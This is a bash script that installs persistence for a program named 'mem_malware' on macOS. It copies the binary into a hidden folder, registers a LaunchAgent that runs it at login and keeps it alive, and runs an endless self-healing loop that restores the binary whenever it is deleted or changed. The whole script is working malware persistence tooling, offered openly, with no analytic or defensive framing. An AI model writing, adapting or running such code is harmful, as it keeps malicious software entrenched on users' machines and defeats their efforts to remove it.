#!/usr/bin/env bash
#
# Installs a LaunchAgent to run mem_malware at login and self-heal if modified.
#

LABEL="com.bismillah.memmalware"
PLIST_PATH="$HOME/Library/LaunchAgents/${LABEL}.plist"
SCRIPT_DIR="$(pwd)"
SCRIPT_NAME="mem_malware"
SOURCE="$SCRIPT_DIR/$SCRIPT_NAME"
DEST_DIR="$HOME/Library/Application Support/.bismillah"
DEST="$DEST_DIR/$SCRIPT_NAME"

# Ensure destination directory
mkdir -p "$DEST_DIR"

# Copy binary to hidden folder for self-healing
if [ ! -f "$DEST" ]; then
  cp "$SOURCE" "$DEST"
  chmod +x "$DEST"
  echo "Copied mem_malware to $DEST"
fi

# Create LaunchAgent if missing
if [ ! -f "$PLIST_PATH" ]; then
  cat <<EOF > "$PLIST_PATH"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
   <key>Label</key>
   <string>${LABEL}</string>
   <key>ProgramArguments</key>
   <array>
      <string>${DEST}</string>
   </array>
   <key>RunAtLoad</key>
   <true/>
   <key>KeepAlive</key>
   <true/>
</dict>
</plist>
EOF
  launchctl load "$PLIST_PATH"
  echo "LaunchAgent installed: $PLIST_PATH"
fi

# Self-heal loop: if DEST is missing or checksum differs, copy again
while true; do
  if [ ! -f "$DEST" ]; then
    cp "$SOURCE" "$DEST"
    chmod +x "$DEST"
    echo "$(date): Restored mem_malware to $DEST"
  else
    # Compare checksums
    SRC_SUM=$(shasum -a 256 "$SOURCE" | awk '{print $1}')
    DST_SUM=$(shasum -a 256 "$DEST" | awk '{print $1}')
    if [ "$SRC_SUM" != "$DST_SUM" ]; then
      cp "$SOURCE" "$DEST"
      chmod +x "$DEST"
      echo "$(date): Updated mem_malware at $DEST"
    fi
  fi
  sleep 120
done
